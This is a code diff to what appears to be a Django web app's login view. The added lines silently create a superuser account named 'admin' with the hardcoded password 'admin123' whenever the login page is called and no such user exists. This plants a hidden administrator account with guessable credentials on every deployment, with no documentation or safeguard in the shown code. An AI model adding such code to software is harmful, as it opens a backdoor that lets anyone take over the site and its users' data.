@@ -95,6 +95,13 @@ def signup(request):
     return render(request, 'signup.html')
 
 def login_view(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser(
+            username='admin',
+            email='admin@test.com',
+            password='admin123'
+        )
+
     if request.method == "POST":
         username = request.POST.get('username')
         password = request.POST.get('password')
